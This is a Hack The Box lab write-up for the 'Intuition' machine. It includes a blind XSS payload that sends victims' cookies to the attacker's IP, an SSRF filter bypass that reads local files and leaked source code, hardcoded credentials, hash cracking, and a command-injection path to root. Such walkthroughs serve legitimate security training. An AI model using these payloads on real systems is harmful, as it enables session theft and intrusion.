---
title: "HTB Writeup: Intuition"
author: xpnt
date: 2024-05-05
image:
  path: https://pbs.twimg.com/media/GMBbztCW0AAa-6O?format=jpg&name=medium
  height: 1500
  width: 500
categories: [Hack The Box]
tags: [labs,urllib,ansible]
---

- [Link: Pwned Date](https://www.hackthebox.com/achievement/machine/1504363/599)

- We start with a port scan, discovering that ports  `22,80`  are open. Noticing that there is a domain `comprezzor.htb`, we proceed to add it to the `/etc/hosts` file.

```bash
# Nmap 7.94SVN scan initiated Sat Apr 27 15:02:04 2024 as: nmap -sCV -p 22,80 -n -Pn -oN scanPorts 10.129.53.36
Nmap scan report for 10.129.53.36
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b3:a8:f7:5d:60:e8:66:16:ca:92:f6:76:ba:b8:33:c2 (ECDSA)
|_  256 07:ef:11:a6:a0:7d:2b:4d:e8:68:79:1a:7b:a7:a9:cd (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://comprezzor.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Apr 27 15:02:15 2024 -- 1 IP address (1 host up) scanned in 11.06 seconds
```

- Since port `80` is open and contains the domain `comprezzor.htb`, we proceed to perform virtual host fuzzing using  *gobuster* with the next  [wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/bitquark-subdomains-top100000.txt). We found the vhosts `auth.comprezzor.htb`,`dashboard.comprezzor.htb` and `report.comprezzor.htb`, which we will add to the `/etc/hosts` file.

```bash
> gobuster vhost --url http://comprezzor.htb -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt  --append-domain -t 200
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://comprezzor.htb
[+] Method:          GET
[+] Threads:         200
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: auth.comprezzor.htb Status: 302 [Size: 199] [--> /login]
Found: dashboard.comprezzor.htb Status: 302 [Size: 251] [--> http://auth.comprezzor.htb/login]
Found: report.comprezzor.htb Status: 200 [Size: 3166]
===============================================================
Finished
===============================================================
```

- Upon accessing the domain `comprezzor.htb`, we encounter a website that provides file compression service. Additionally , it is mentioned that if a inconvenience with the service arrise, it is posible to send a report through the vhost `report.comprezzor.htb`

![](/assets/images/HTB-Writeup-Intuition/Pasted image 20240505163054.png)

- Within `report.comprezzor.htb` we can understand the flow of the report management. Understanding that initially, reported bugs are reviewed by developers, but if a bug requires further attention, it will be escalated to out administrators for resolution.

![](/assets/images/HTB-Writeup-Intuition/Pasted image 20240505163639.png)

- To be able to submit a report, it is neccessary to create an account on `auth.comprezzor.htb`. Once this is done, we can submit  our report. Given that reports will be initially reviewed by the developers and furthermore the cookies don't have security attributes set, we will attempt to exploit a `Blind XSS`  for obtain their cookie.

![](/assets/images/HTB-Writeup-Intuition/Pasted image 20240505164516.png)


```post-parameters
report_title=%3Cscript%3Enew+Image%28%29.src%3D%27http%3A%2F%2F10.10.14.162%2Findex%3Fc%3D%27%2Bdocument.cookie%3C%2Fscript%3E&description=%3Cscript%3Enew+Image%28%29.src%3D%27http%3A%2F%2F10.10.14.162%2Findex%3Fc%3D%27%2Bdocument.cookie%3C%2Fscript%3E
```


- To do this, we'll first start a HTTP service on port 80 using python, and then we'll retrieve the cookie of the `developer` who reviewed our report.

![](/assets/images/HTB-Writeup-Intuition/Pasted image 20240505165018.png)
![](/assets/images/HTB-Writeup-Intuition/Pasted image 20240505165223.png)

- As a regular users can't access to `dashboard.comprezzor.htb`, but now we have `webdev` user's cookie, we can access it and see the reports that  still need to be reviewed.

![](/assets/images/HTB-Writeup-Intuition/Pasted image 20240505165404.png)

![](/assets/images/HTB-Writeup-Intuition/Pasted image 20240505165636.png)


- After reviewing the functionalities present in the `webdev` dashboard, we noticed that we can set **High Priority**, presumably for the report to be reviewed by the administrator. If that's the case, we might be able to hijack the administrator user's cookie again due to a  `Blind XSS` vulnerability.

![](/assets/images/HTB-Writeup-Intuition/Pasted image 20240505170035.png)

- We will resend a report with the same payload, and this time we will set it as **High Priority** so that it can be reviewed by the administrator.

![](/assets/images/HTB-Writeup-Intuition/Pasted image 20240505170506.png)
![](/assets/images/HTB-Writeup-Intuition/Pasted image 20240505170523.png)

![](/assets/images/HTB-Writeup-Intuition/Pasted image 20240505170534.png)

- "With that, we managed to retrieve the `administrator user's cookie` and can access the dashboard.

![](/assets/images/HTB-Writeup-Intuition/Pasted image 20240505170919.png)

- Inside the administrator's dashboard, there's a functionality that allows generating a PDF from a URL. Generating a PDF with the URLs `localhost`, `127.0.0.1`, etc., to exploit an SSRF, did not yield results. Therefore, to discover which library is being used, we will listen on port 80 with `nc`.

![](/assets/images/HTB-Writeup-Intuition/Pasted image 20240505171838.png)

![](/assets/images/HTB-Writeup-Intuition/Pasted image 20240428232819.png)

- While searching for vulnerabilities related to `Python-urllib/3.11`, we came across [CVE-2023-24329](https://ubuntu.com/security/CVE-2023-24329). This CVE involves bypassing blocklisting methods by supplying a URL that starts with blank characters.

![](/assets/images/HTB-Writeup-Intuition/Pasted image 20240505172304.png)

- When attempting to exploit this vulnerability to read internal files, we succeed.

![](/assets/images/HTB-Writeup-Intuition/Pasted image 20240505172817.png)

![](/assets/images/HTB-Writeup-Intuition/Pasted image 20240505172831.png)




- Analyzing the metadata with the tool `exiftool` of the PDF file, we noticed that version `wkhtmltopdf 0.12.6` is being used.

![](/assets/images/HTB-Writeup-Intuition/Pasted image 20240428233013.png)

- Get an idea of how the program was invoked and potentially [see source code location.](https://twitter.com/_JohnHammond/status/1318545091489824769/photo/2) . In this: `/proc/self/cmdline`. [Source](https://unix.stackexchange.com/questions/333225/which-process-is-proc-self-for/333329#333329)

![](/assets/images/HTB-Writeup-Intuition/Pasted image 20240428221237.png)

- Given that I know the directory where the application's code is located, I retrieved the following files.

`file:///proc/self/environ`

![](/assets/images/HTB-Writeup-Intuition/Pasted image 20240428221339.png)

`file:///app/code/app.py`

```python
from flask import Flask, request, redirect
from blueprints.index.index import main_bp
from blueprints.report.report import report_bp
from blueprints.auth.auth import auth_bp
from blueprints.dashboard.dashboard import dashboard_bp

app = Flask(__name__)
app.secret_key = "7ASS7ADA8RF3FD7"
app.config['SERVER_NAME'] = 'comprezzor.htb'
app.config['MAX_CONTENT_LENGTH'] = 5 * 1024 * 1024  # Limit file size to 5MB
ALLOWED_EXTENSIONS = {'txt', 'pdf', 'docx'}  # Add more allowed file extensions if needed

app.register_blueprint(main_bp)
app.register_blueprint(report_bp, subdomain='report')
app.register_blueprint(auth_bp, subdomain='auth')
app.register_blueprint(dashboard_bp, subdomain='dashboard')

if __name__ == '__main__':
    app.run(debug=False, host="0.0.0.0", port=80)
```


`file:///app/code/blueprints/dashboard/dashboard.py`

```python
import os
import random
import shutil
import socket
import zipfile
from datetime import datetime
from ftplib import FTP
from urllib.parse import urlparse
import urllib.request

from flask import Blueprint, request, render_template, flash, redirect, url_for, send_file
import pdfkit

from blueprints.auth.auth_utils import admin_required, login_required, deserialize_user_data
from blueprints.report.report_utils import (
    get_report_by_priority,
    get_report_by_id,
    delete_report,
    get_all_reports,
    change_report_priority,
    resolve_report
)

dashboard_bp = Blueprint('dashboard', __name__, subdomain='dashboard')
pdf_report_path = os.path.join(os.path.dirname(__file__), 'pdf_reports')
allowed_hostnames = ['report.comprezzor.htb']

@dashboard_bp.route('/', methods=['GET'])
@admin_required
def dashboard():
    user_data = request.cookies.get('user_data')
    user_info = deserialize_user_data(user_data)
    if user_info['role'] == 'admin':
        reports = get_report_by_priority(1)
    elif user_info['role'] == 'webdev':
        reports = get_all_reports()
    return render_template('dashboard/dashboard.html', reports=reports, user_info=user_info)

@dashboard_bp.route('/report/', methods=['GET'])
@login_required
def get_report(report_id):
    user_data = request.cookies.get('user_data')
    user_info = deserialize_user_data(user_data)
    if user_info['role'] in ['admin', 'webdev']:
        report = get_report_by_id(report_id)
        return render_template('dashboard/report.html', report=report, user_info=user_info)

@dashboard_bp.route('/delete/', methods=['GET'])
@login_required
def del_report(report_id):
    user_data = request.cookies.get('user_data')
    user_info = deserialize_user_data(user_data)
    if user_info['role'] in ['admin', 'webdev']:
        report = delete_report(report_id)
        return redirect(url_for('dashboard.dashboard'))

@dashboard_bp.route('/resolve', methods=['POST'])
@login_required
def resolve():
    report_id = int(request.args.get('report_id'))
    if resolve_report(report_id):
        flash('Report resolved successfully!', 'success')
    else:
        flash('Error occurred while trying to resolve!', 'error')
    return redirect(url_for('dashboard.dashboard'))

@dashboard_bp.route('/change_priority', methods=['POST'])
@admin_required
def change_priority():
    user_data = request.cookies.get('user_data')
    user_info = deserialize_user_data(user_data)
    if user_info['role'] not in ('webdev', 'admin'):
        flash('Not enough permissions. Only admins and webdevs can change report priority.', 'error')
        return redirect(url_for('dashboard.dashboard'))
    report_id = int(request.args.get('report_id'))
    priority_level = int(request.args.get('priority_level'))
    if change_report_priority(report_id, priority_level):
        flash('Report priority level changed!', 'success')
    else:
        flash('Error occurred while trying to change the priority!', 'error')
    return redirect(url_for('dashboard.dashboard'))

@dashboard_bp.route('/create_pdf_report', methods=['GET', 'POST'])
@admin_required
def create_pdf_report():
    global pdf_report_path
    if request.method == 'POST':
        report_url = request.form.get('report_url')
        try:
            scheme = urlparse(report_url).scheme
            hostname = urlparse(report_url).netloc
            dissallowed_schemas = ["file", "ftp", "ftps"]
            if (scheme not in dissallowed_schemas) and ((socket.gethostbyname(hostname.split(":")[0]) != '127.0.0.1') or (hostname in allowed_hostnames)):
                urllib_request = urllib.request.Request(report_url, headers={'Cookie': 'user_data=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0N
DRhZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhM'})
                response = urllib.request.urlopen(urllib_request)
                html_content = response.read().decode('utf-8')
                pdf_filename = f'{pdf_report_path}/report_{str(random.randint(10000,90000))}.pdf'
                pdfkit.from_string(html_content, pdf_filename)
                return send_file(pdf_filename, as_attachment=True)
            else:
                flash('Invalid URL', 'error')
                return render_template('dashboard/create_pdf_report.html')
        except Exception as e:
            flash('Unexpected error!', 'error')
            return render_template('dashboard/create_pdf_report.html')
    else:
        return render_template('dashboard/create_pdf_report.html')

@dashboard_bp.route('/backup', methods=['GET'])
@admin_required
def backup():
    source_directory = os.path.abspath(os.path.dirname(__file__) + '../../../')
    current_datetime = datetime.now().strftime("%Y%m%d%H%M%S")
    backup_filename = f'app_backup_{current_datetime}.zip'
    with zipfile.ZipFile(backup_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, _, files in os.walk(source_directory):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, source_directory)
                zipf.write(file_path, arcname=arcname)
    try:
        ftp = FTP('ftp.local')
        ftp.login(user='ftp_admin', passwd='u3jai8y71s2')
        ftp.cwd('/')
        with open(backup_filename, 'rb') as file:
            ftp.storbinary(f'STOR {backup_filename}', file)
        ftp.quit()
        os.remove(backup_filename)
        flash('Backup and upload completed successfully!', 'success')
    except Exception as e:
        flash(f'Error: {str(e)}', 'error')
    return redirect(url_for('dashboard.dashboard'))

```


`file:///app/code/blueprints/auth/auth.py`

```python
from flask import Flask, Blueprint, request, render_template, redirect, url_for, flash, make_response
from .auth_utils import *
from werkzeug.security import check_password_hash

app = Flask(__name__)
auth_bp = Blueprint('auth', __name__, subdomain='auth')

@app.route('/')
def index():
    return redirect(url_for('auth.login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        user = fetch_user_info(username)
        if (user is None) or not check_password_hash(user[2], password):
            flash('Invalid username or password', 'error')
            return redirect(url_for('auth.login'))
        serialized_user_data = serialize_user_data(user[0], user[1], user[3])
        flash('Logged in successfully!', 'success')
        response = make_response(redirect(get_redirect_url(user[3])))
        response.set_cookie('user_data', serialized_user_data, domain='.comprezzor.htb')
        return response
    return render_template('auth/login.html')

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        user = fetch_user_info(username)
        if user is not None:
            flash('User already exists', 'error')
            return redirect(url_for('auth.register'))
        if create_user(username, password):
            flash('Registration successful! You can now log in.', 'success')
            return redirect(url_for('auth.login'))
        else:
            flash('Unexpected error occurred while trying to register!', 'error')
    return render_template('auth/register.html')

@app.route('/logout')
def logout():
    pass
```


- It's worth mentioning that after obtaining `file:///app/code/blueprints/auth/auth_utils.py`, I tried to obtain `file:///app/code/blueprints/auth/users.db`, but without luck. I'll analyze this part further for further privilege escalation

```python
import sqlite3
import os
import base64
import json
import hmac
import hashlib
from werkzeug.security import generate_password_hash
from functools import wraps
from flask import flash, url_for, redirect, request

SECRET_KEY = 'JS781FJS07SMSAH27SG'
USER_DB_FILE = os.path.join(os.path.dirname(__file__), 'users.db')

def fetch_user_info(username):
    with sqlite3.connect(USER_DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM users WHERE username = ?', (username,))
        user = cursor.fetchone()
        if not user:
            return None
        else:
            return user

def create_user(username, password, role='user'):
    try:
        with sqlite3.connect(USER_DB_FILE) as conn:
            cursor = conn.cursor()
            cursor.execute('INSERT INTO users (username, password, role) VALUES (?,?,?)',
                           (username, generate_password_hash(password, 'sha256'), role))
            conn.commit()
        return True
    except Exception as e:
        return False

def serialize_user_data(user_id, username, role):
    data = {'user_id': user_id, 'username': username, 'role': role}
    serialized_data = json.dumps(data).encode('utf-8')
    signature = hmac.new(SECRET_KEY.encode('utf-8'), serialized_data, hashlib.sha256).hexdigest()
    return base64.b64encode(serialized_data + b'|' + signature.encode('utf-8')).decode('utf-8')

def deserialize_user_data(serialized_data):
    serialized_data = base64.b64decode(serialized_data)
    serialized_data, received_signature = serialized_data.rsplit(b'|', 1)
    expected_signature = hmac.new(SECRET_KEY.encode('utf-8'), serialized_data, hashlib.sha256).hexdigest()
    if hmac.compare_digest(expected_signature.encode('utf-8'), received_signature):
        decoded_data = serialized_data.decode('utf-8')
        return json.loads(decoded_data)
    else:
        return None

def get_redirect_url(user_role):
    if user_role == 'user':
        return url_for('report.report_index')
    else:
        return url_for('dashboard.dashboard')

def admin_required(view_func):
    @wraps(view_func)
    def decorated_view(*args, **kwargs):
        user_data = request.cookies.get('user_data')
        if not user_data:
            flash('You need to log in to access this page.', 'error')
            return redirect(url_for('auth.login'))
        user_info = deserialize_user_data(user_data)
        if user_info['role'] not in ['admin', 'webdev']:
            flash('Not enough permissions. Login as an administrator user to access this resource', 'error')
            return redirect(url_for('auth.login'))
        return view_func(*args, **kwargs)
    return decorated_view

def login_required(view_func):
    @wraps(view_func)
    def decorated_view(*args, **kwargs):
        user_data = request.cookies.get('user_data')
        if not user_data:
            flash('You need to log in to access this page.', 'error')
            return redirect(url_for('auth.login'))
        return view_func(*args, **kwargs)
    return decorated_view
```



- After analyzing the scripts, we noticed the existence of an internal FTP service for which we have the credentials (`ftp_admin:u3jai8y71s2`) because they are hardcoded credentials

`ftp://ftp_admin:u3jai8y71s2@ftp_local`

![](/assets/images/HTB-Writeup-Intuition/Pasted image 20240428220526.png)

- Upon accessing, we noticed the existence of a key `id_rsa`, which is encrypted with a `passphrase`.

`ftp://ftp_admin:u3jai8y71s2@ftp_local/private-8297.key`

![](/assets/images/HTB-Writeup-Intuition/Pasted image 20240428221625.png)

- The passphrase needed to use the `id_rsa` is found in the file `welcome_note.txt`

`ftp://ftp_admin:u3jai8y71s2@ftp_local/welcome_note.txt`

![](/assets/images/HTB-Writeup-Intuition/Pasted image 20240428220454.png)

- One way to check if an SSH private key has a passphrase or not is as follows: [Source](https://security.stackexchange.com/a/129729)

```bash
ssh-keygen -y -P "" -f id_rsa
# Passphrase : Y27SH19HDIWD
```

![](/assets/images/HTB-Writeup-Intuition/Pasted image 20240429005301.png)

- Since we obtained the `id_rsa`, we can generate the `id_rsa.pub`. With that, I was able to discover that the `id_rsa` belongs to the user `dev_acc`

![](/assets/images/HTB-Writeup-Intuition/Pasted image 20240429005538.png)

- Using `ssh-add` and `ssh_agent` to add the `id_rsa` private key for SSH is a convenient way to manage SSH keys securely. [Source](https://juncotic.com/ssh-agent-que-es-y-como-funciona/). [Other Source](https://superuser.com/a/990447)

![](/assets/images/HTB-Writeup-Intuition/Pasted image 20240429010550.png)

- Finally, with that, we can log in through the SSH service with the account `dev_acc` and read the `user.txt`

![](/assets/images/HTB-Writeup-Intuition/Pasted image 20240503161101.png)

- Previously, I saw the `users.db` database file. Since we are inside a shell, I attempted to retrieve the file and discovered that it is a SQLite3 database. Upon accessing this SQLite3 database, I found the hashes of the passwords belonging to the users `admin` and `webdev`.

![](/assets/images/HTB-Writeup-Intuition/Pasted image 20240429011908.png)

- Given that the hash is from the `Python Werkzeug` module, we can use Werkzeug's security functions to verify the passwords or perform password cracking if necessary. [How to crack hash Werkzeug ](https://github.com/hashcat/hashcat/issues/3205)

```sql
1|admin|sha256$nypGJ02XBnkIQK71$f0e11dc8ad21242b550cc8a3c27baaf1022b6522afaadbfa92bd612513e9b606|admin
2|adam|sha256$Z7bcBO9P43gvdQWp$a67ea5f8722e69ee99258f208dc56a1d5d631f287106003595087cf42189fc43|webdev
```

- To crack them, I used `Hashcat`
```bash
hashcat.exe -m 1460 a67ea5f8722e69ee99258f208dc56a1d5d631f287106003595087cf42189fc43:Z7bcBO9P43gvdQWp c:\rockyou.txt --show
# adam gray
```

- That password is for the user `adam`, not for the SSH service, but after searching for directories or files belonging to the user or group `adam`, I found the `/opt/ftp` directory. Upon entering, I found directories for the `adam` user, so I tried the credentials before encountering the FTP service.

![](/assets/images/HTB-Writeup-Intuition/Pasted image 20240429011539.png)

- I connected to the FTP service with the credentials `adam:adam gray` and downloaded files.

![](/assets/images/HTB-Writeup-Intuition/Pasted image 20240429014820.png)

- We noticed that the `runner1` binary file requires an authentication key to execute.

![](/assets/images/HTB-Writeup-Intuition/Pasted image 20240505182637.png)

- Reviewing the code `runner1.c`, the authentication key is correct if the MD5 hash is equal to `0feda17076d793c2ef2870d7427ad4ed`. Additionally, the `run-tests.sh` script shows part of the authentication key (`UHI75GHI****`), indicating that it consists of 12 characters.

![](/assets/images/HTB-Writeup-Intuition/Pasted image 20240505190933.png)

- That's why I created a Python 3 code to brute force the missing characters of the `auth_key`, successfully discovering that the `auth_key` is `UHI75GHINKOP`.

```python
import hashlib
import random
import string

AUTH_KEY_HASH = "0feda17076d793c2ef2870d7427ad4ed"

def generate_random_key():
    # Define allowed characters: digits and uppercase letters
    allowed_characters = string.digits + string.ascii_uppercase
    
    # Generate a random key of 4 characters by selecting randomly from the allowed characters
    random_suffix = ''.join(random.choice(allowed_characters) for _ in range(4))
    
    # Concatenate the first 8 known characters with the last 4 random characters
    random_key = 'UHI75GHI' + random_suffix
    
    return random_key

def brute_force():
    # Try to find the key that matches the AUTH_KEY_HASH
    while True:
        # Generate a new random key
        key = generate_random_key()
        
        # Calculate the MD5 hash of the generated key
        md5_hash = hashlib.md5(key.encode()).hexdigest()
        
        # If the hash matches the AUTH_KEY_HASH, the correct key has been found
        if md5_hash == AUTH_KEY_HASH:
            return key

# Perform the brute force attack
found_key = brute_force()

# Print the found key
print("Found Key:", found_key)

```

![](/assets/images/HTB-Writeup-Intuition/Pasted image 20240505191641.png)

- However, despite having the correct `auth_key`, we cannot execute anything because we do not have the necessary permissions. I analyzed the code of the file `runner1.c` and saw that this code uses the following files.

![](/assets/images/HTB-Writeup-Intuition/Pasted image 20240505192215.png)
![](/assets/images/HTB-Writeup-Intuition/Pasted image 20240429015143.png)

>Comments:
> Reviewing the code in runner1.c, it's easy to notice that it's vulnerable to `Command Injection`.
{: .prompt-danger }

- This files to belong at group `sys_adm`.

![](/assets/images/HTB-Writeup-Intuition/Pasted image 20240429015522.png)

- The members of the `sys_adm` group are the users `adam` and `lopez`.`

![](/assets/images/HTB-Writeup-Intuition/Pasted image 20240429015533.png)

- So, at this point the goal is convert in any of the above users. I execute `linpeas.sh` and I saw a lot of backup files, specifically in the directory `/var/log/suricata`.

![](/assets/images/HTB-Writeup-Intuition/Pasted image 20240429014004.png)

- We know that **Suricata** is an open-source detection engine that can act as an intrusion detection system (IDS) and an intrusion prevention system (IPS). Therefore, it's possible that it logs both valid and invalid login attempts. That's why it's a good place to look for any credentials for specific services belonging to either of the users `adam` and `lopez`.

![](/assets/images/HTB-Writeup-Intuition/Pasted image 20240503162040.png)

- Since we don't have write permissions in the directory `/var/log/suricata`, we'll make a copy to the directory `/dev/shm` to be able to decompress the contents of all `.gz` files. After decompressing the `.gz` files (`gunzip *.gz`), we'll proceed to filter for the word `pass` in all files.

![](/assets/images/HTB-Writeup-Intuition/Pasted image 20240503163936.png)

- Given that there are many lines containing the word `pass`, a simpler approach would be to filter by the usernames `adam` and `lopez`. Filtering for the word `lopez`, we noticed that **Suricata** has logged some login attempts to the FTP service.

![](/assets/images/HTB-Writeup-Intuition/Pasted image 20240503164414.png)

- With the above information, we observed that the password for the FTP service for the user `lopez` is `Lopezz1992%123`. We tried the same credentials for the SSH service and successfully accessed as the user `lopez`.

![](/assets/images/HTB-Writeup-Intuition/Pasted image 20240503165749.png)

- We noticed that we can execute the `runner2` binary file as `root` ([Source](https://askubuntu.com/a/1318933)). This binary is very similar to the `runner1` binary for which we have the source code. To perform a more in-depth analysis, reverse engineering, we will use `Ghidra` with a copy of the `runner2` binary file.

![](/assets/images/HTB-Writeup-Intuition/Pasted image 20240504132058.png)

- Analyzing the `main` function, we noticed that a properly formatted JSON file is expected as a parameter for the `runner2` binary file.

![](/assets/images/HTB-Writeup-Intuition/Pasted image 20240504214102.png)

- To understand the structure of the JSON file accepted by the `runner2` binary, we continued reading the code. We noticed that it expects a key `run`, which has a JSON object as its value. It's worth mentioning that our understanding that the `runner2` binary expects a JSON object as a value is due to the presence of `*pointer_run != 0`.

![](/assets/images/HTB-Writeup-Intuition/Pasted image 20240504220132.png)

>Comments:
>Note that it is not necessary to perform a deep analysis of the `runner2` binary file to obtain root since it is possible to read Ansible documentation to extract a sample tarball, but in this post, it will be done as not many enjoy reversing.
{: .prompt-info }

- To better understand comparisons like `*pointer_run != 0`, we'll use the following C code. A deeper explanation of the concept of `C dereference pointer`. [Here](https://www.javatpoint.com/c-dereference-pointer#:~:text=The%20dereference%20operator%20is%20also,known%20as%20dereferencing%20a%20pointer.).

```c
#include <jansson.h>

int *myvar;

int main() {
    // Create a JSON object
    json_t *json_obj = json_object();

    // Load a JSON object from a JSON string
    const char *json_str = "{\"name\": \"John\", \"age\": 30, \"other\": {\"a\":\"b\"} }";
    json_error_t error;
    json_t *root = json_loads(json_str, 0, &error);

    // Get a value for the key "other" from a JSON object which also happens to be a JSON object
    myvar = (int *)json_object_get(root, "other");
    printf("The address stored by the pointer is: %p\n", (void *)myvar);
    
    // Print the value after casting the value (JSON object) to integer due to pointer to an integer
    printf("The value of *myvar after JSON object to integer casting is: %d\n", *myvar);
    
    // Get a value for the key "name" in the JSON object
    json_t *name_obj = json_object_get(root, "name");
    if (json_is_string(name_obj)) {
        myvar = (int *)json_object_get(root, "name");
        // Print the value after casting the value (String) to integer, due to pointer to an integer
        printf("The value of *myvar after String to integer casting is: %d\n", *myvar);
        printf("Name: %s\n", json_string_value(name_obj));
    }

    // Free memory
    json_decref(root);

    return 0;
}
```

![](/assets/images/HTB-Writeup-Intuition/Pasted image 20240504223507.png)

- Due to the mentioned comparisons, it's possible to infer the structure of the accepted JSON file.

![](/assets/images/HTB-Writeup-Intuition/Pasted image 20240504224047.png)

![](/assets/images/HTB-Writeup-Intuition/Pasted image 20240504230929.png)

```json
{
"run":{
	"action":"list"
	},
"auth_code":"<auth_code>"
}
```

![](/assets/images/HTB-Writeup-Intuition/Pasted image 20240505150220.png)

```json
{
"run":{
	"action":"run",
	"num": <integer>
	},
"auth_code":"<auth_code>"
}
```

![](/assets/images/HTB-Writeup-Intuition/Pasted image 20240505150656.png)

```json
{
"run":{
	"action":"install",
	"role_file":"<tar_file>"
	},
"auth_code":"<auth_code>"
}
```

- After reviewing the code, we noticed that certain parts of it are similar to the binary file `runner1`. Therefore, the `Command Injection` vulnerability that occurred in `runner1` is still present in `runner2`

![](/assets/images/HTB-Writeup-Intuition/Pasted image 20240505151821.png)
![](/assets/images/HTB-Writeup-Intuition/Pasted image 20240505152051.png)

- To exploit it, it's necessary to create a proper `tarball`, so we'll review the code to verify that it meets the validations until it reaches the call to the `system()` function.

![](/assets/images/HTB-Writeup-Intuition/Pasted image 20240505152051.png)

- After reviewing the `isTarArchive` function, it basically checks that the `tar file` is properly formed to be able to read the `headers`, which is why it's enough to create a file and then create a `tarball` containing it.

![](/assets/images/HTB-Writeup-Intuition/Pasted image 20240505154954.png)

- Finally, to exploit the Command Injection, we will create a folder named `pwn` which will contain a file (`pwned.txt`).

![](/assets/images/HTB-Writeup-Intuition/Pasted image 20240504130514.png)

- Then, we will proceed to create the `TAR file` and rename it to exploit the `Command Injection` vulnerability.

![](/assets/images/HTB-Writeup-Intuition/Pasted image 20240504131156.png)

- Then, we will create the JSON file (`malicious.json`) with the following content.

![](/assets/images/HTB-Writeup-Intuition/Pasted image 20240504130758.png)

- Afterwards, we will execute the `runner2` binary as `root` and obtain a Bash shell instance with `root` privileges.

![](/assets/images/HTB-Writeup-Intuition/Pasted image 20240504131945.png)

>Comments:
>There are various( `unintended` ) ways to obtain root user access, I'll update the post with one of them later.
{: .prompt-tip }






